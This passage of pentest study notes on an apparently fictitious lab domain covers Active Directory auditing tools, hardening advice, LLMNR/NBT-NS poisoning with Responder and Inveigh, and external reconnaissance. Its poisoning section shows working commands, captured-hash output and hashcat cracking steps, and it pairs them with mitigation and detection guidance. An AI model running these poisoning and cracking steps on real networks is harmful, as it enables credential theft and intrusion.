minutes, it produces a report which will give you an overview of your Active Directory security. This report can be generated on other domains by using the existing trust links.\n</code></pre> <p>The default option is the <code>healthcheck</code> run, which will establish a baseline overview of the domain, and provide us with pertinent information dealing with misconfigurations and vulnerabilities. Even better, PingCastle can report recent vulnerability susceptibility, our shares, trusts, the delegation of permissions, and much more about our user and computer states. Under the Scanner option, we can find most of these checks.</p> <pre><code>|:.      PingCastle (Version 2.10.1.0     1/19/2022 8:12:02 AM)\n|  #:.   Get Active Directory Security at 80% in 20% of the time\n# @@  &gt;  End of support: 7/31/2023\n| @@@:\n: .#                                 Vincent LE TOUX (contact@pingcastle.com)\n  .:       twitter: @mysmartlogon                    https://www.pingcastle.com\nSelect a scanner\n================\nWhat scanner whould you like to run ?\nWARNING: Checking a lot of workstations may raise security alerts.\n  1-aclcheck                                                  9-oxidbindings\n  2-antivirus                                                 a-remote\n  3-computerversion                                           b-share\n  4-foreignusers                                              c-smb\n  5-laps_bitlocker                                            d-smb3querynetwork\n  6-localadmin                                                e-spooler\n  7-nullsession                                               f-startup\n  8-nullsession-trust                                         g-zerologon\n  0-Exit\n==============================\nCheck authorization related to users or groups. Default to everyone, authenticated users and domain users\n</code></pre> <p>Throughout the report, there are sections such as domain, user, group, and trust information and a specific table calling out \"anomalies\" or issues that may require immediate attention. We will also be presented with the domain's overall risk score.</p> <p>Aside from being helpful in performing very thorough domain enumeration when combined with other tools, PingCastle can be helpful to give clients a quick analysis of their domain security posture, or can be used by internal teams to self-assess and find areas of concern or opportunities for further hardening. </p>  Group3r <p>Group3r is a tool purpose-built to find vulnerabilities in Active Directory associated Group Policy. Group3r must be run from a domain-joined host with a domain user (it does not need to be an administrator), or in the context of a domain user (i.e., using <code>runas /netonly</code>).</p> <pre><code>C:\\xyz&gt; group3r.exe -f &lt;filepath-name.log&gt; \n</code></pre> <p>When running Group3r, we must specify the <code>-s</code> or the <code>-f</code> flag. These will specify whether to send results to stdout (-s), or to the file we want to send the results to (-f). For more options and usage information, utilize the <code>-h</code> flag, or check out the usage info at the link above.</p> <p>When reading the output from Group3r, each indentation is a different level, so no indent will be the GPO, one indent will be policy settings, and another will be findings in those settings. Below we will take a look at the output shown from a finding.</p>  ADRecon <p>In an assessment where stealth is not required, it is also worth running a tool like ADRecon and analyzing the results, just in case all of our enumeration missed something minor that may be useful to us or worth pointing out to our client.</p> <pre><code>PS C:\\xyz&gt; .\\ADRecon.ps1\n\n[*] ADRecon v1.1 by Prashant Mahajan (@prashant3535)\n[*] Running on legalcorp.local\\MS01 - Member Server\n[*] Commencing - 03/28/2022 09:24:58\n[-] Domain\n[-] Forest\n[-] Trusts\n[-] Sites\n[-] Subnets\n[-] SchemaHistory - May take some time\n[-] Default Password Policy\n[-] Fine Grained Password Policy - May need a Privileged Account\n[-] Domain Controllers\n[-] Users and SPNs - May take some time\n[-] PasswordAttributes - Experimental\n[-] Groups and Membership Changes - May take some time\n[-] Group Memberships - May take some time\n[-] OrganizationalUnits (OUs)\n[-] GPOs\n[-] gPLinks - Scope of Management (SOM)\n[-] DNS Zones and Records\n[-] Printers\n[-] Computers and SPNs - May take some time\n[-] LAPS - Needs Privileged Account\n[-] BitLocker Recovery Keys - Needs Privileged Account\n[-] GPOReport - May take some time\n[*] Total Execution Time (mins): 11.05\n[*] Output Directory: C:\\Tools\\ADRecon-Report-20220328092458\n</code></pre> <p>You will get a report in HTML format and a folder with CSV results. When generating the report, it should be noted that Excel needs to be installed, or the script will not automatically generate the report in that manner; it will just leave you with the .csv files. If you want output for Group Policy, you need to ensure the host you run from has the <code>GroupPolicy</code> PowerShell module installed. We can go back later and generate the Excel report from another host using the <code>-GenExcel</code> switch and feeding in the report folder.</p> <pre><code>PS C:\\xyz&gt; ls\n\n    Directory: C:\\Tools\\ADRecon-Report-20220328092458\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----         3/28/2022  12:42 PM                CSV-Files\n-a----         3/28/2022  12:42 PM        2758736 GPO-Report.html\n-a----         3/28/2022  12:42 PM         392780 GPO-Report.xml\n</code></pre>","title":"Additional AD Auditing Techniques"},{"location":"active_directory/defensive_considerations/hardening_ad/","text":"<p>We should understand some of the common defense tactics that can be implemented and how they would affect the networks we are assessing. These basic hardening steps will do much more for an organization (regardless of size) than purchasing the next big EDR or SIEM tool. Those extra defensive measures and equipment only help if you have a baseline security posture with features like logging enabled and proper documentation and tracking of the hosts within the network.</p>  Document and Audit  <p>Proper AD hardening can keep attackers contained and prevent lateral movement, privilege escalation, and access to sensitive data and resources. One of the essential steps in AD hardening is understanding everything present in your AD environment. An audit of everything listed below should be done annually, if not every few months, to ensure your records are up to date. We care about:</p> Things To Document and Track <ul> <li> <code>Naming conventions of OUs, computers, users, groups</code> </li> <li> <code>DNS, network, and DHCP configurations</code> </li> <li> <code>An intimate understanding of all GPOs and the objects that they are applied to</code> </li> <li> <code>Assignment of FSMO roles</code> </li> <li> <code>Full and current application inventory</code> </li> <li> <code>A list of all enterprise hosts and their location</code> </li> <li> <code>Any trust relationships we have with other domains or outside entities</code> </li> <li> <code>Users who have elevated permissions</code> </li> </ul>  People, Processes, and Technology People <p>In even the most hardened environment, users remain the weakest link. Enforcing security best practices for standard users and administrators will prevent \"easy wins\" for pentesters and malicious attackers. We should also strive to keep our users educated and aware of threats to themselves. The measures below are a great way to start securing the Human element of an AD environment.</p> <ul> <li>The organization should have a strong password policy, with a password filter that disallows the use of common words (i.e., welcome, password, names of months/days/seasons, and the company name). If possible, an enterprise password manager should be used to assist users with choosing and using complex passwords.</li> <li>Rotate passwords periodically for all service accounts.</li> <li>Disallow local administrator access on user workstations unless a specific business need exists.</li> <li>Disable the default <code>RID-500 local admin</code> account and create a new admin account for administration subject to LAPS password rotation.</li> <li>Implement split tiers of administration for administrative users. Too often, during an assessment, you will gain access to Domain Administrator credentials on a computer that an administrator uses for all work activities.</li> <li>Clean up privileged groups. <code>Does the organization need 50+ Domain/Enterprise Admins?</code> Restrict group membership in highly privileged groups to only those users who require this access to perform their day-to-day system administrator duties.</li> <li>Where appropriate, place accounts in the <code>Protected Users</code> group.</li> <li>Disable Kerberos delegation for administrative accounts (the Protected Users group may not do this)</li> </ul> Processes <p>Maintaining and enforcing policies and procedures that can significantly impact an organization's overall security posture is necessary. Without defined policies, it is impossible to hold an organization's employees accountable, and difficult to respond to an incident without defined and practiced procedures such as a disaster recovery plan. The items below can help to define processes, policies, and procedures.</p> <ul> <li>Proper policies and procedures for AD asset management. <ul> <li>AD host audit, the use of asset tags, and periodic asset inventories can help ensure hosts are not lost.</li> </ul> </li> <li>Access control policies (user account provisioning/de-provisioning), multi-factor authentication mechanisms.</li> <li>Processes for provisioning and decommissioning hosts (i.e., baseline security hardening guideline, gold images)</li> <li>AD cleanup policies <ul> <li> <code>Are accounts for former employees removed or just disabled?</code> </li> <li> <code>What is the process for removing stale records from AD?</code> </li> <li>Processes for decommissioning legacy operating systems/services (i.e., proper uninstallation of Exchange when migrating to 0365).</li> <li>Schedule for User, groups, and hosts audit.</li> </ul> </li> </ul> Technology <p>Periodically review AD for legacy misconfigurations and new and emerging threats. As changes are made to AD, ensure that common misconfigurations are not introduced. Pay attention to any vulnerabilities introduced by AD and tools or applications utilized in the environment.</p> <ul> <li>Run tools such as BloodHound, PingCastle, and Grouper periodically to identify AD misconfigurations.</li> <li>Ensure that administrators are not storing passwords in the AD account description field.</li> <li>Review SYSVOL for scripts containing passwords and other sensitive data.</li> <li>Avoid the use of \"normal\" service accounts, utilizing Group Managed (gMSA) and Managed Service Accounts (MSA) where ever possible to mitigate the risk of Kerberoasting.</li> <li>Disable Unconstrained Delegation wherever possible.</li> <li>Prevent direct access to Domain Controllers through the use of hardened jump hosts.</li> <li>Consider setting the <code>ms-DS-MachineAccountQuota</code> attribute to <code>0</code>, which disallows users from adding machine accounts and can prevent several attacks such as the noPac attack and Resource-Based Constrained Delegation (RBCD)</li> <li>Disable the print spooler service wherever possible to prevent several attacks</li> <li>Disable NTLM authentication for Domain Controllers if possible</li> <li>Use Extended Protection for Authentication along with enabling Require SSL only to allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services</li> <li>Enable SMB signing and LDAP signing</li> <li>Take steps to prevent enumeration with tools like BloodHound</li> <li>Ideally, perform quarterly penetration tests/AD security assessments, but if budget constraints exist, these should be performed annually at the very least.</li> <li>Test backups for validity and review/practice disaster recovery plans.</li> </ul>","title":"Hardening Active Directory"},{"location":"active_directory/foothold/llmnr_nbtns_poisonong_from_linux/","text":"<p>Depending on the network, this attack may provide low-privileged or administrative level password hashes that can be cracked offline or even cleartext credentials.</p> <p>Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails.</p>  Example of LLMNR/NBT-NS Poisoning <ol> <li>A host attempts to connect to the print server at \\\\print01.legalcorp.local, but accidentally types in \\\\printer01.legalcorp.local.</li> <li>The DNS server responds, stating that this host is unknown.</li> <li>The host then broadcasts out to the entire local network asking if anyone knows the location of \\\\printer01.legalcorp.local.</li> <li>The attacker (us with <code>Responder</code> running) responds to the host stating that it is the \\\\printer01.legalcorp.local that the host is looking for.</li> <li>The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.</li> <li>This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.</li> </ol>  Responder in Action <p>If we are successful and manage to capture a hash, Responder will print it out on screen and write it to a log file per host located in the <code>/usr/share/responder/logs</code> directory. Hashes are saved in the format <code>(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt</code>, and one hash is printed to the console and stored in its associated log file unless <code>-v</code> mode is enabled.</p> <p>Any of the rogue servers (i.e., SMB) can be disabled in the <code>Responder.conf</code> file.</p> <pre><code>secops@kali[/kali]$ ls\n\nAnalyzer-Session.log                Responder-Session.log\nConfig-Responder.log                SMB-NTLMv2-SSP-172.16.5.200.txt\nHTTP-NTLMv2-172.16.5.200.txt        SMB-NTLMv2-SSP-172.16.5.25.txt\nPoisoners-Session.log               SMB-NTLMv2-SSP-172.16.5.50.txt\nProxy-Auth-NTLMv2-172.16.5.200.txt\n</code></pre> <p>Starting Responder with Default Settings <pre><code>sudo responder -I ens224 \n</code></pre></p> <p>Typically we should start Responder and let it run for a while in a tmux window while we perform other enumeration tasks to maximize the number of hashes that we can obtain. Once we are ready, we can pass these hashes to Hashcat using hash mode <code>5600</code> for NTLMv2 hashes that we typically obtain with Responder. We may at times obtain NTLMv1 hashes and other types of hashes.</p> <p>NetNTLMv2 hashes are very useful once cracked, but cannot be used for techniques such as pash-the-hash, meaning we have to attempt to crack them offline.</p> <pre><code>secops@kali[/kali]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt \n\nhashcat (v6.1.1) starting...\n\n&lt;SNIP&gt;\n</code></pre> <p>Lucky for us our target domain allows weak 8-character passwords. This hash type can be \"slow\" to crack even on a GPU cracking rig, so large and complex passwords may be more difficult or impossible to crack within a reasonable amount of time.</p>","title":"LLMNR/NBT-NS Poisoning - Linux"},{"location":"active_directory/foothold/llmnr_nbtns_poisonong_from_windows/","text":"<p>If we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool Inveigh works similar to Responder.</p> <p>Wiki that lists all parameters and usage instructions.</p> Using Inveigh <pre><code>PS C:\\xyz&gt; Import-Module .\\Inveigh.ps1\nPS C:\\xyz&gt; (Get-Command Invoke-Inveigh).Parameters\n\nKey                     Value\n---                     -----\nADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata\nKerberosHostHeader      System.Management.Automation.ParameterMetadata\nProxyIgnore             System.Management.Automation.ParameterMetadata\nPcapTCP                 System.Management.Automation.ParameterMetadata\nPcapUDP                 System.Management.Automation.ParameterMetadata\nSpooferHostsReply       System.Management.Automation.ParameterMetadata\nSpooferHostsIgnore      System.Management.Automation.ParameterMetadata\nSpooferIPsReply         System.Management.Automation.ParameterMetadata\n&lt;SNIP&gt;\n</code></pre> <p>Start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file.</p> <pre><code>PS C:\\xyz&gt; Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n\n[*] Inveigh 1.506 started at 2022-02-28T19:26:30\n[+] Elevated Privilege Mode = Enabled\n[+] Primary IP Address = 172.16.5.25\n[+] Spoofer IP Address = 172.16.5.25\n[+] ADIDNS Spoofer = Disabled\n[+] DNS Spoofer = Enabled\n[+] DNS TTL = 30 Seconds\n[+] LLMNR Spoofer = Enabled\n[+] LLMNR TTL = 30 Seconds\n[+] mDNS Spoofer = Disabled\n[+] NBNS Spoofer For Types 00,20 = Enabled\n[+] NBNS TTL = 165 Seconds\n[+] SMB Capture = Enabled\n[+] HTTP Capture = Enabled\n[+] HTTPS Certificate Issuer = Inveigh\n[+] HTTPS Certificate CN = localhost\n[+] HTTPS Capture = Enabled\n[+] HTTP/HTTPS Authentication = NTLM\n[+] WPAD Authentication = NTLM\n[+] WPAD NTLM Authentication Ignore List = Firefox\n[+] WPAD Response = Enabled\n[+] Kerberos TGT Capture = Disabled\n[+] Machine Account Capture = Disabled\n[+] Console Output = Full\n[+] File Output = Enabled\n[+] Output Directory = C:\\Tools\nWARNING: [!] Run Stop-Inveigh to stop\n[*] Press any key to stop console output\nWARNING: [-] [2022-02-28T19:26:31] Error starting HTTP listener\nWARNING: [!] [2022-02-28T19:26:31] Exception calling \"Start\" with \"0\" argument(s): \"An attempt was made to access a\nsocket in a way forbidden by its access permissions\" $HTTP_listener.Start()\n[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]\n[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]\n[+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]\n[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]\n[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]\n[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]\n[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]\n[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]\n[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]\n[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]\n[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]\n[+] [2022-02-28T19:26:33] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]\n[+] [2022-02-28T19:26:34] TCP(445) SYN packet detected from 172.16.5.125:56834\n[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from 172.16.5.125:56834\n[+] [2022-02-28T19:26:34] SMB(445) NTLM challenge 7E3B0E53ADB4AE51 sent to 172.16.5.125:56834\n\n&lt;SNIP&gt;\n</code></pre> <p>We should be getting LLMNR and mDNS requests.</p>  <p>The PowerShell version of Inveigh is the original version and is no longer updated.</p> <pre><code>PS C:\\xyz&gt; \\Inveigh.exe\n\n[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]\n[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]\n[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]\n[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]\n[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]\n[ ] DHCPv6\n[+] DNS Packet Sniffer [Type A]\n[ ] ICMPv6\n[+] LLMNR Packet Sniffer [Type A]\n[ ] MDNS\n[ ] NBNS\n[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]\n[ ] HTTPS\n[+] WebDAV [WebDAVAuth NTLM]\n[ ] Proxy\n[+] LDAP Listener [Port 389]\n[+] SMB Packet Sniffer [Port 445]\n[+] File Output [C:\\Tools]\n[+] Previous Session Files (Not Found)\n[*] Press ESC to enter/exit interactive console\n[!] Failed to start HTTP listener on port 80, check IP and port usage.\n[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.\n[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]\n[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]\n[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]\n[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]\n[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]\n[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]\n[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]\n[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]\n[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]\n[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]\n[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]\n[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]\n[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]\n[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]\n[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]\n[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]\n</code></pre> <p>The options with a <code>[+]</code> are default and enabled by default and the ones with a <code>[ ]</code> before them are disabled. The running console output also shows us which options are disabled.</p> <p><code>ESC</code> key to enter the console while Inveigh is running.</p> <p>After typing <code>HELP</code> and hitting enter, we are presented with several option. <pre><code>=============================================== Inveigh Console Commands ===============================================\n\nCommand                           Description\n========================================================================================================================\nGET CONSOLE                     | get queued console output\nGET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses\nGET LOG                         | get log entries; add search string to filter results\nGET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results\nGET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results\nGET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter results\nGET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter results\nGET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashes\nGET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashes\nGET CLEARTEXT                   | get captured cleartext credentials\nGET CLEARTEXTUNIQUE             | get unique captured cleartext credentials\nGET REPLYTODOMAINS              | get ReplyToDomains parameter startup values\nGET REPLYTOHOSTS                | get ReplyToHosts parameter startup values\nGET REPLYTOIPS                  | get ReplyToIPs parameter startup values\nGET REPLYTOMACS                 | get ReplyToMACs parameter startup values\nGET IGNOREDOMAINS               | get IgnoreDomains parameter startup values\nGET IGNOREHOSTS                 | get IgnoreHosts parameter startup values\nGET IGNOREIPS                   | get IgnoreIPs parameter startup values\nGET IGNOREMACS                  | get IgnoreMACs parameter startup values\nSET CONSOLE                     | set Console parameter value\nHISTORY                         | get command history\nRESUME                          | resume real time console output\nSTOP                            | stop Inveigh\n</code></pre></p> <p>View unique captured hashes by typing <code>GET NTLMV2UNIQUE</code>.</p> <pre><code>================================================= Unique NTLMv2 Hashes =================================================\n\nHashes\n========================================================================================================================\nbackupagentnforendn\n&lt;SNIP&gt;\n</code></pre> <p>We can type in <code>GET NTLMV2USERNAMES</code> and see which usernames we have collected. These can be used to perform additional enumeration against and see which are worth attempting to crack offline using Hashcat.</p> <pre><code>=================================================== NTLMv2 Usernames ===================================================\n\nIP Address                        Host                              Username                          Challenge\n========================================================================================================================\n172.16.5.125                    | ACADEMY-EA-FILE                 | LEGALCORP\\backupagent       | B5013246091943D7\n172.16.5.125                    | ACADEMY-EA-FILE                 | LEGALCORP\\forend            | 32FD89BD78804B04\n172.16.5.125                    | ACADEMY-EA-FILE                 | LEGALCORP\\clusteragent      | 28BF08D82FA998E4\n172.16.5.125                    | ACADEMY-EA-FILE                 | LEGALCORP\\wley              | 277AC2ED022DB4F7\n172.16.5.125                    | ACADEMY-EA-FILE                 | LEGALCORP\\svc_qualys        | 5F9BB670D23F23ED\n</code></pre>  What now? <p>We've now captured hashes for several accounts. At this point, we would want to perform enumeration using a tool such as BloodHound to determine whether any or all of these hashes are worth cracking. If we get lucky and crack a hash for a user account with some privileged access or rights, we can begin expanding our reach into the domain. We may even get very lucky and crack the hash for a Domain Admin. If we were unlucky in cracking hashes or cracked some but did not yield any fruit, then perhaps password spraying will be more successful.</p>  Mitigation against this Attack <p>Mitre ATT&amp;CK lists this technique as ID: T1557.001, <code>Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay</code>.</p> <p>There are a few ways to mitigate this attack. To ensure that these spoofing attacks are not possible, we can disable LLMNR and NBT-NS.</p> <p>We can disable LLMNR in Group Policy by going to Computer Configuration \u2192 Administrative Templates \u2192 Network \u2192 DNS Client and enabling \"Turn OFF Multicast Name Resolution.\"</p> <p>NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening <code>Network and Sharing Center</code> under <code>Control Panel</code>, clicking on <code>Change adapter settings</code>, right-clicking on the adapter to view its properties, selecting <code>Internet Protocol Version 4 (TCP/IPv4)</code>, and clicking the <code>Properties</code> button, then clicking on <code>Advanced</code> and selecting the <code>WINS</code> tab and finally selecting <code>Disable NetBIOS over TCP/IP</code>.</p> <p>While it is not possible to disable NBT-NS directly via GPO, we can create a PowerShell script under Computer Configuration --&gt; Windows Settings --&gt; Script (Startup/Shutdown) --&gt; Startup with something like the following:</p> <pre><code>$regkey = \"HKLM:SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters\\Interfaces\"\nGet-ChildItem $regkey |foreach { Set-ItemProperty -Path \"$regkey\\$($_.pschildname)\" -Name NetbiosOptions -Value 2 -Verbose}\n</code></pre> <p>In the Local Group Policy Editor, we will need to double click on <code>Startup</code>, choose the <code>PowerShell Scripts</code> tab, and select \"For this GPO, run scripts in the following order\" to <code>Run Windows PowerShell scripts first</code>, and then click on <code>Add</code> and choose the script. For these changes to occur, we would have to either reboot the target system or restart the network adapter.</p> <p>To push this out to all hosts in a domain, we could create a GPO using <code>Group Policy Management</code> on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as:</p> <pre><code>\\\\legalcorp.local\\SYSVOL\\legalcorp.local\\scripts\n</code></pre> <p>Once the GPO is applied to specific OUs and those hosts are restarted, the script will run at the next reboot and disable NBT-NS, provided that the script still exists on the SYSVOL share and is accessible by the host over the network.</p> <p>Other mitigations include filtering network traffic to block LLMNR/NetBIOS traffic and enabling SMB Signing to prevent NTLM relay attacks. Network intrusion detection and prevention systems can also be used to mitigate this activity, while network segmentation can be used to isolate hosts that require LLMNR or NetBIOS enabled to operate correctly.</p>  Detection <p>It is not always possible to disable LLMNR and NetBIOS, and therefore we need ways to detect this type of attack behavior. One way is to use the attack against the attackers by injecting LLMNR and NBT-NS requests for non-existent hosts across different subnets and alerting if any of the responses receive answers which would be indicative of an attacker spoofing name resolution responses. This blog post explains this method more in-depth.</p> <p>Furthermore, hosts can be monitored for traffic on ports UDP 5355 and 137, and event IDs 4697 and 7045 can be monitored for. Finally, we can monitor the registry key <code>HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient</code> for changes to the <code>EnableMulticast</code> DWORD value. A value of <code>0</code> would mean that LLMNR is disabled.</p>","title":"LLMNR/NBT-NS Poisoning - Windows"},{"location":"active_directory/initial_enum/external_recon_enum_principles/","text":"What are we looking for?    Data Point Description     <code>IP Space</code> Valid ASN for our target, netblocks in use for the organization's public-facing infrastructure, cloud presence and the hosting providers, DNS record entries, etc.   <code>Domain Information</code> Based on IP data, DNS, and site registrations. Who administers the domain? Are there any subdomains tied to our target? Are there any publicly accessible domain services present? (Mailservers, DNS, Websites, VPN portals, etc.) Can we determine what kind of defenses are in place? (SIEM, AV, IPS/IDS in use, etc.)   <code>Schema Format</code> Can we discover the organization's email accounts, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc.   <code>Data Disclosures</code> For data disclosures we will be looking for publicly accessible files ( .pdf, .ppt, .docx, .xlsx, etc. ) for any information that helps shed light on the target. For example, any published files that contain <code>intranet</code> site listings, user metadata, shares, or other critical software or hardware in the environment (credentials pushed to a public GitHub repo, the internal AD username format in the metadata of a PDF, for example.)   <code>Breach Data</code> Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold.    Where Are We Looking?    Resource Examples     <code>ASN / IP registrars</code> IANA, arin for searching the Americas, RIPE for searching in Europe, BGP Toolkit   <code>Domain Registrars &amp; DNS</code> Domaintools, PTRArchive, ICANN, manual DNS record requests against the domain in question or against well known DNS servers, such as <code>8.8.8.8</code>.   <code>Social Media</code> Searching Linkedin, Twitter, Facebook, your region's major social media sites, news articles, and any relevant info you can find about the organization.   <code>Public-Facing Company Websites</code> Often, the public website for a corporation will have relevant info embedded. News articles, embedded documents, and the \"About Us\" and \"Contact Us\" pages can also be gold mines.   <code>Cloud &amp; Dev Storage Spaces</code> GitHub, AWS S3 buckets &amp; Azure Blog storage containers, Google searches using \"Dorks\"   <code>Breach Data Sources</code> HaveIBeenPwned to determine if any corporate email accounts appear in public breach data, Dehashed to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords against any exposed login portals (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, custom applications, etc.) that may use AD authentication.     Finding Address Spaces <p>Address blocks assigned to an organization: <code>BGP-Toolkit</code> hosted by Hurricane Electric</p> DNS <p>Validate our scope and find out about reachable hosts the customer did not disclose in their scoping document. Sites like domaintools, and viewdns.info.</p>  Public Data <p>Social media can clue us in to how the organization is structured, what kind of equipment they operate, potential software and security implementations, their schema, and more. Also, job-related sites like LinkedIn, Indeed.com, and Glassdoor.</p>  Example Enumeration Process <p>Example on the <code>LEGALCORP.com</code> domain without performing any heavy scans.</p> <p>Check BGP-Toolkit</p> <ul> <li>IP Address: 134.209.24.248</li> <li>Mail Server: mail1.LEGALCORP.com</li> <li>Nameservers: NS1.LEGALCORP.com &amp; NS2.LEGALCORP.com</li> </ul> <p>Utilize <code>viewdns.info</code> to validate the IP address of our target. Both results match, which is a good sign. Let's try another route to validate the two nameservers in our results.</p> <pre><code>secops@kali[/kali]$ nslookup ns1.LEGALCORP.com\n\nServer:     192.168.186.1\nAddress:    192.168.186.1#53\n\nNon-authoritative answer:\nName:   ns1.LEGALCORP.com\nAddress: 178.128.39.165\n\nnslookup ns2.LEGALCORP.com\nServer:     192.168.86.1\nAddress:    192.168.86.1#53\n\nNon-authoritative answer:\nName:   ns2.LEGALCORP.com\nAddress: 206.189.119.186 \n</code></pre> <p>We now have <code>two</code> new IP addresses to add to our list for validation and testing. Before taking any further action with them, ensure they are in-scope for your test.</p> <p>LEGALCORP is a fictitious company, so there is no real social media presence. However, we would check sites like LinkedIn, Twitter, Instagram, and Facebook for helpful info if it were real. </p> <p>Looking for any documents. Using <code>filetype:pdf inurl:LEGALCORP.com</code> as a search, we are looking for PDFs.</p> <p>Using <code>intext:\"@LEGALCORP.com\" inurl:LEGALCORP.com</code>, we are looking for any instance that appears similar to the end of an email address on the website. One promising result came up with a contact page.</p> <p>Browsing the contact page, we can see several emails for staff in different offices around the globe. We now have an idea of their email naming convention (first.last) and where some people work in the organization. This could be handy in later password spraying attacks or if social engineering/phishing were part of our engagement scope.</p>","title":"External Recon"},{"location":"active_directory/initial_enum/init_enum_domain/","text":"Key Data Points    Data Point Description     <code>AD Users</code> We are trying to enumerate valid user accounts we can target for password spraying.   <code>AD Joined Computers</code> Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.   <code>Key Services</code> Kerberos, NetBIOS, LDAP, DNS   <code>Vulnerable Hosts and Services</code> Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)    Identifying Hosts <p></p> <p>ARP packets make us aware of the hosts: <code>172.16.5.5</code>, <code>172.16.5.25</code>, <code>172.16.5.50</code>, <code>172.16.5.100</code>, and <code>172.16.5.125</code>.</p> <p></p> <p>MDNS makes us aware of the ACADEMY-EA-WEB01 host.</p> <p>Tcpdump Output <pre><code>secops@kali[/kali]$ sudo tcpdump -i ens224 \n</code></pre></p> <p>Responder is a tool built to listen, analyze, and poison <code>LLMNR</code>, <code>NBT-NS</code>, and <code>MDNS</code> requests and responses. Fow now, all we are utilizing is the tool in its Analyze mode. This will passively listen to the network and not send any poisoned packets.</p> <pre><code>sudo responder -I ens224 -A \n</code></pre> <p>Notice below that we found a few unique hosts not previously mentioned in our Wireshark captures. It's worth noting these down as we are starting to build a nice target list of IPs and DNS hostnames.</p> <p>Passive checks have given us a few hosts to note down for a more 